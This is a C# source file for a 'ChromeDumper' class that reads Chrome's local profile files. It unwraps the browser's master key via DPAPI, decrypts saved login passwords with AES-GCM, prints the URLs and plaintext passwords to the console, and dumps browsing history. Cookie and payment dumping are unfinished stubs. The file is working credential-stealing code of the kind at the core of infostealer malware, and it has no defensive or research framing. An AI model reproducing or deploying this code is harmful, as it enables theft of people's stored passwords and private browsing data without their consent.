using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using Newtonsoft.Json;
using System.Data.SQLite;

using System.Security.Cryptography;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Parameters;

namespace ChromeDumper
{
    internal class clsDumper
    {
        public string m_szChromeDirectory { get; set; }

        private string _m_szLoginDataPath { get; set; }
        public string m_szLoginDataPath 
        { 
            get { return _m_szLoginDataPath; } 
            set { _m_szLoginDataPath = value; } 
        }
        
        private string _m_szLocalState { get; set; }
        public string m_szLocalState
        {
            get { return _m_szLocalState; }
            set { _m_szLocalState = value; }
        }
        private string _m_szHistory { get; set; }
        public string m_szHistory
        {
            get { return _m_szHistory; }
            set { _m_szHistory = value; }
        }

        private string m_szConnStringLoginData { get { return $"Data Source={m_szLoginDataPath};Version=3;"; } }
        public string m_szConnStringHistory { get { return $"DataSource={m_szHistory};Version=3;New=False;Compress=True;"; } }

        public clsDumper(string szChromeDirectory)
        {
            m_szChromeDirectory = szChromeDirectory;
            fnInit();
        }
        public clsDumper()
        {
            string szAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            m_szChromeDirectory = $"{szAppData}\\Google\\Chrome";
            fnInit();
        }

        public struct stCredential
        {
            public string URL { get; set; }
            public string Username { get; set; }
            public string Password { get; set; }
            public DateTime CreationDate { get; set; }
            public DateTime LastUsedDate {  get; set; }
        }
        public struct stHistory
        {
            public string URL { get; set; }
            public string Title { get; set; }
            public DateTime VisitedDate { get; set; }
        }
        public struct stCookie
        {
            public string URL { get; set; }
            public string Name { get; set; }
            public string Value { get; set; }
        }
        public struct stAddress
        {

        }
        public struct stPayment
        {
            
        }

        private void fnInit()
        {
            _m_szLoginDataPath = $"{m_szChromeDirectory}\\User Data\\Default\\Login Data";
            _m_szLocalState = $"{m_szChromeDirectory}\\User Data\\Local State";
            _m_szHistory = $"{m_szChromeDirectory}\\User Data\\Default\\History";
        }

        private bool fnbIsV10(byte[] abData) => Encoding.UTF8.GetString(abData.Take(3).ToArray()) == "v10";

        private byte[] fnabGetKey()
        {
            string szContent = File.ReadAllText(m_szLocalState);
            dynamic dyJson = JsonConvert.DeserializeObject(szContent);
            string szKey = dyJson.os_crypt.encrypted_key;
            byte[] abBinKey = Convert.FromBase64String(szKey).Skip(5).ToArray();

            byte[] abDecryptedKey = ProtectedData.Unprotect(abBinKey, null, DataProtectionScope.CurrentUser);

            return abDecryptedKey;
        }

        private void fnPrepare(byte[] abCipher, out byte[] abNonce, out byte[] abCipherTextTag)
        {
            abNonce = new byte[12];
            abCipherTextTag = new byte[abCipher.Length - 3 - abNonce.Length];

            Array.Copy(abCipher, 3, abNonce, 0, abNonce.Length);
            Array.Copy(abCipher, 3 + abNonce.Length, abCipherTextTag, 0, abCipherTextTag.Length);
        }
        private string fnszDecrypt(byte[] abCipher, byte[] abKey, byte[] abIV)
        {
            try
            {
                GcmBlockCipher gcmCipher = new GcmBlockCipher(new AesEngine());
                AeadParameters aeadParams = new AeadParameters(new KeyParameter(abKey), 128, abIV, null);

                gcmCipher.Init(false, aeadParams);
                byte[] abPlain = new byte[gcmCipher.GetOutputSize(abCipher.Length)];
                int nRetLength = gcmCipher.ProcessBytes(abCipher, 0, abCipher.Length, abPlain, 0);
                gcmCipher.DoFinal(abPlain, nRetLength);

                return Encoding.UTF8.GetString(abPlain).TrimEnd("\r\n\0".ToCharArray());
            }
            catch (Exception ex)
            {
                return $"[DECRYPT FAILED://{ex.Message}]";
            }
        }

        string Decrypt(byte[] pass, byte[] key)
        {
            byte[] iv = new byte[12]; // initialize a new 12-byte IV
            Array.Copy(pass, 3, iv, 0, 12); // copy the IV from the password byte array

            byte[] ciphertext = new byte[pass.Length - 31];
            Array.Copy(pass, 15, ciphertext, 0, pass.Length - 31);

            byte[] tag = new byte[16];// initialize a new 16-byte authentication tag
            Array.Copy(pass, pass.Length - 16, tag, 0, 16); // copy the authentication tag from the end of the password byte array

            using AesGcm aesGcm = new AesGcm(key);
            byte[] decryptedData = new byte[ciphertext.Length]; // initialize a new byte array for the decrypted data
            aesGcm.Decrypt(iv, ciphertext, tag, decryptedData); // decrypt the ciphertext using the key, IV, and authentication tag

            return Encoding.UTF8.GetString(decryptedData);
        }

        public List<stCredential> fnDumpPassword()
        {
            fnInit();

            List<stCredential> lc = new List<stCredential>();
            string szTempFile = Path.GetTempFileName();
            File.Delete(szTempFile);
            File.Copy(m_szLoginDataPath, szTempFile);
            m_szLoginDataPath = szTempFile;

            Console.WriteLine(m_szLoginDataPath);
            Console.ReadKey();

            byte[] abKey = fnabGetKey();
            DataTable dt = fndtQuery("SELECT * FROM logins", m_szConnStringLoginData);

            foreach (DataRow dr in dt.Rows)
            {
                byte[] abCipherPassword = (byte[])dr["password_value"];
                long lDate1 = long.Parse(dr["date_created"].ToString());
                long lDate2 = long.Parse(dr["date_last_used"].ToString());
                DateTime dtEpochStart = new DateTime(1601, 1, 1, 0, 0, 0, DateTimeKind.Utc);

                DateTime dtCreationDate = dtEpochStart.AddTicks(lDate1);
                DateTime dtLastLoginDate = dtEpochStart.AddTicks(lDate2);

                long lCreationDate = (dtCreationDate - dtEpochStart).Ticks;
                long lLastLoginDate = (dtLastLoginDate - dtEpochStart).Ticks;

                if (fnbIsV10(abCipherPassword))
                {
                    byte[] abNonce, abCipherTextTag;
                    fnPrepare(abCipherPassword, out abNonce, out abCipherTextTag);
                    string szPassword = fnszDecrypt(abCipherTextTag, abKey, abNonce);

                    Console.WriteLine(szPassword);
                }
                else
                {
                    string szPassword = string.Empty;
                    try { szPassword = Decrypt(abCipherPassword, abKey); }
                    catch (Exception ex) { szPassword = $"[DECRYPT FAILED://{ex.Message}]"; }
                    Console.WriteLine(dr["origin_url"]);
                    Console.WriteLine(Convert.ToBase64String(abCipherPassword));
                    Console.WriteLine(szPassword);
                }

                Console.ReadKey();

                /*
                foreach (DataColumn dc in dt.Columns)
                {
                    
                }
                */

                Console.WriteLine("----------------");
            }

            File.Delete(szTempFile);

            return lc;
        }
        public List<stHistory> fnDumpHistory()
        {
            fnInit();

            List<stHistory> lh = new List<stHistory>();
            string szTempFile = Path.GetTempFileName();
            File.Delete(szTempFile);
            File.Copy(m_szHistory, szTempFile);
            m_szHistory = szTempFile;

            DataTable dt = fndtQuery("SELECT * FROM urls order by last_visit_time desc", m_szConnStringHistory);

            foreach (DataRow dr in dt.Rows)
            {
                lh.Add(new stHistory()
                {
                    URL = (string)dr["url"],
                    Title = (string)dr["title"],
                });
                Console.WriteLine(dr["last_visit_time"]);
            }

            File.Delete(szTempFile);

            return lh;
        }
        public List<stCookie> fnDumpCookie()
        {
            List<stCookie> lc = new List<stCookie>();


            return lc;
        }

        private DataTable fndtQuery(string szQuery, string szConnString)
        {
            DataTable dt = new DataTable();
            using (SQLiteConnection sqlConn = new SQLiteConnection(szConnString))
            {
                sqlConn.Open();

                using (SQLiteDataAdapter adapter = new SQLiteDataAdapter(szQuery, sqlConn))
                {
                    DataSet ds = new DataSet();
                    adapter.Fill(ds);
                    dt = ds.Tables[0];
                }

                sqlConn.Close();
            }

            return dt;
        }
    }
}
